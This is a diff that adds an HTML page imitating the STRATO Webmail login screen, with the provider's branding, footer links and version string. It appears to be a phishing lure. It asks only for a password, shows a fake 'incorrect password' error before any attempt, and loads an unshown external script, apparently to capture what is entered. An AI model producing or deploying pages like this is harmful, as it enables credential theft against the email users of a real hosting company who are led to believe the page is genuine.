@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="output.css" />
+  </head>
+  <body>
+    <header>
+      <div
+        class="bg-[#FF8800] py-4 fixed top-0 w-full flex justify-between items-center px-5 lg:px-28"
+      >
+        <div class="hidden md:block">
+          <img class="w-[150px] h-auto" src="./assets/logo.svg" alt="" />
+        </div>
+        <div class="md:hidden">
+          <img
+            class="w-[60px] h-auto"
+            src="./assets/stratoLogoWeiss.svg"
+            alt=""
+          />
+        </div>
+        <ul class="text-white text-[12px] flex items-center justify-between">
+          <li class="min-w-fit">
+            <span class="hidden lg:inline-block"
+              ><i class="fa fa-question-circle"></i
+            ></span>
+            Help & Contact
+          </li>
+          <li class="">
+            <span id="io-ox-languages">
+              <div class="relative">
+                <div class="dropdown open" id="language-dropdown">
+                  <button
+                    id="language-toggle"
+                    class="flex items-center rounded-md px-4 py-2 focus:outline-none"
+                  >
+                    <i class="fa fa-globe mr-2 hidden lg:block"></i>
+                    <span class="toggle-text min-w-fit">English (UK)</span>
+                    <span class="caret ml-2">&#9662;</span>
+                  </button>
+                  <div
+                    class="dropdown-content absolute z-10 hidden bg-blue-800 border border-gray-300 rounded-md mt-1 w-full shadow-lg"
+                  >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >English (UK)</a
+                    >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >English (USA)</a
+                    >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >Deutsch</a
+                    >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >Español</a
+                    >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >Français</a
+                    >
+                    <a href="#" class="block px-4 py-2 hover:bg-gray-100"
+                      >Italiano</a
+                    >
+                  </div>
+                </div>
+              </div>
+            </span>
+          </li>
+          <li>
+            <button
+              class="bg-white lg:bg-transparent border border-white text-blue-500 lg:text-white font-semibold px-2 md:px-5 py-2 hover:bg-white hover:text-blue-400"
+            >
+              Customer Login
+            </button>
+          </li>
+        </ul>
+      </div>
+    </header>
+
+    <main class="lg:h-[100vh]">
+      <div
+        class="mx-auto w-[320px] md:w-[450px] border mt-[90px] mb-5 shadow-2xl rounded"
+      >
+        <div class="flex flex-col w-full" id="box-form">
+          <div id="box-form-header" class="mb-4 bg-gray-100 p-6">
+            <h1 class="text-xl md:text-2xl font-bold">
+              <i class="fa fa-envelope text-gray-600"></i>
+              <span class="header-login-title text-gray-600"
+                >STRATO Webmail</span
+              >
+            </h1>
+          </div>
+          <div id="box-form-body">
+            <form
+              id="use-form"
+              class="max-w-lg mx-auto bg-white p-6 rounded-lg shadow-md"
+            >
+              <div class="mb-4">
+                <h1 class="text-2xl mb-2 font-semibold text-gray-600">Login</h1>
+                <input type="hidden" name="location" value="" />
+                <p id="use-help" class="text-red-500"></p>
+              </div>
+
+              <div class="mb-4">
+                <label for="use-password" class="block mb-2">Password</label>
+                <div class="relative mb-2">
+                  <input
+                    type="password"
+                    id="use-password"
+                    name="password"
+                    class="form-control block w-full px-4 pl-8 py-2 border rounded-lg focus:outline-none focus:ring"
+                    required
+                    autocomplete="current-password"
+                  />
+                  <i
+                    class="fa fa-lock absolute top-[50%] transform translate-y-[-50%] translate-x-3 text-gray-400"
+                  ></i>
+                </div>
+                <p class="text-end text-blue-700 font-semibold">
+                  Forgotten Password
+                </p>
+              </div>
+
+              <div class="mb-4 flex items-center">
+                <input
+                  type="checkbox"
+                  class="mr-2"
+                  id="use-store-box"
+                  checked
+                  name="staySignedIn"
+                  value="1"
+                />
+                <label for="use-store-box" class="text-sm"
+                  >Stay signed in</label
+                >
+              </div>
+              <div class="bg-[red] py-3 px-3 rounded text-white mb-5">
+                The username or password is incorrect. <br />
+                (LGI-0006)
+              </div>
+
+              <div class="mb-2 flex justify-center">
+                <button
+                  type="submit"
+                  class="w-[270px] md:w-[400px] bg-blue-500 text-white py-2 rounded hover:bg-blue-600"
+                >
+                  Sign in
+                </button>
+              </div>
+              <span class="text-green-700" id="confirmation-message"></span>
+            </form>
+          </div>
+          <div id="io-ox-information-message"></div>
+        </div>
+      </div>
+    </main>
+
+    <footer
+      class="bg-[#FF8800] py-5 px-5 lg:px-10 lg:flex items-center justify-between"
+    >
+      <ul class="lg:flex lg:space-x-6 lg:items-center text-[14px]">
+        <li class="mb-3 lg:mb-0">
+          <a
+            target="_blank"
+            href="https://www.strato-hosting.co.uk/"
+            class="text-white hover:underline text-lg font-bold"
+          >
+            STRATO-HOSTING.co.uk
+          </a>
+        </li>
+        <li>
+          <a
+            target="_blank"
+            href="https:///www.strato-hosting.co.uk/terms-and-conditions/"
+            class="text-white hover:underline"
+          >
+            Terms &amp; Conditions
+          </a>
+        </li>
+        <li>
+          <a
+            target="_blank"
+            href="https://www.strato-hosting.co.uk/privacy-policy/"
+            class="text-white hover:underline"
+          >
+            Privacy Policy
+          </a>
+        </li>
+        <li>
+          <a
+            target="_blank"
+            href="https://www.strato-hosting.co.uk/imprint/"
+            class="text-white hover:underline"
+          >
+            Imprint
+          </a>
+        </li>
+      </ul>
+
+      <div class="lg:text-center text-white text-[13px]">
+        <span>© 2024 Open-Xchange GmbH</span>
+        <div class="text-center mt-2 inline-block ml-2">
+          <span>Version: </span>
+          <span>7.10.6</span>
+        </div>
+      </div>
+    </footer>
+
+    <script src="nextscript.js"></script>
+  </body>
+</html>
